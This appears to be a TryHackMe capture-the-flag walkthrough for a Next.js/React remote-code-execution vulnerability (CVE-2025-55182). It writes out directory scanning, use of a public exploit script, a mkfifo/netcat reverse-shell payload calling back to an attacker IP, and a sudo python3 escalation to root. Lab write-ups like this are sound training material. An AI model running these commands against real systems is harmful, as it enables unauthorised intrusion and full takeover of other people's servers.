# Corp Website Walkthrough

## Intro
Welcome to the Corp Website challenge, here is the link to the [room](https://tryhackme.com/room/lafb2026e7) on TryHackMe.
This is a medium level challenge about a vulnerability discovered last year... , part of the Valentine 2026 event.

### Scenario 
Valentine's Day is fast approaching, and "Romance & Co" are gearing up for their busiest season.
Behind the scenes, however, things are going wrong. Security alerts suggest that "Romance & Co" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!

As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the "Romance & Co" web application and determine exactly how the breach occurred.

You can find the web application here: `http://MACHINE_IP:3000`
<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
Let's take a look at the website by navigating to `http://MACHINE_IP:3000` in our web browser.
While we browser the site to understand how it works we can launch a directory scan in the background:
```bash
gobuster dir -u http://10.81.161.214:3000  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

After a bit we get the directory scan results:
```
/.git/logs/           (Status: 308) [Size: 10] [--> /.git/logs]
/cgi-bin/             (Status: 308) [Size: 8] [--> /cgi-bin]
/render?url=https://www.google.com (Status: 308) [Size: 35] [--> /render%3Furl=https:/www.google.com]
/render/https://www.google.com (Status: 308) [Size: 29] [--> /render/https:/www.google.com]
```

Also trough an extension such as *Wappalizer* we can see it is running React and NextJS 16.0.6.
Searching on the internet for that version we can find a couple of CVEs, some leading to RCE, article [here](https://nsfocusglobal.com/react-next-js-remote-code-execution-vulnerability-cve-2025-55182-cve-2025-66478-notice/)

Thanks to this we are able to craft an HTTP request to run commands on the target server.
Looking for a PoC i either found this interesting step by step manual one using `curl` [here](https://p3ta00.github.io/cve-2025-55182-react2shell-rce/) or if you prefer a fully automated one i found also this Python [one](https://github.com/Chocapikk/CVE-2025-55182/blob/main/exploit.py).

Either way we can run some commands like `whomai`, `ls`, understand the environment and access the first flag.

Example  with the automated one:
```bash
git clone https://github.com/Chocapikk/CVE-2025-55182.git
```
```bash
python3 -m venv venv
source venv/bin/activate
```
```bash
pip install -r requirement.txt
```

Run a command:
```bash
python3 exploit.py -u http://10.81.161.214:3000 -c "cat /home/daniel/user.txt"
```
--> REDACTED


Now let's use this to get a reverse shell.
Prepare a listener on your machine:
```bash
nc -lvnp 1234
```

Send this payload:
```bash
python3 exploit.py -u http://10.81.161.214:3000 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.81.110.219 1234 >/tmp/f"
```

This will give us a shell, but is a bit unstable and not fully interactive, if you do not know how to upgrade it i made a full guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/998200255c91249aad8e1f2183c79847f3c6bcc7/Tips-%26-Resources/Reverse_Shell-Upgrade.md).

<br/>

### Privilege Escalation
With initial access to the system and the first flag seized we can now look for a way to escalate our privileges.
We can start our enumeration with a command such as:
```bash
sudo -l
```

To see if our current user "daniel" is allowed to run any command as super user.
Good for us its a YES:
```
User daniel may run the following commands on romance:
    (root) NOPASSWD: /usr/bin/python3
```

We can run `python3` as root without even needing a password. 
We can use it to spawn a shell as root.

```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

Now that we are root we can get the last flag:
```bash
cat /root/root.txt
```

--> REDACTED


<br/>
<br/>


Congratulations, you have successfully exploited the web vulnerability to get initial access to the target via a reverse shell and finally leveraged an unsafe sudoers permission to become root and get the flag.
 
Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
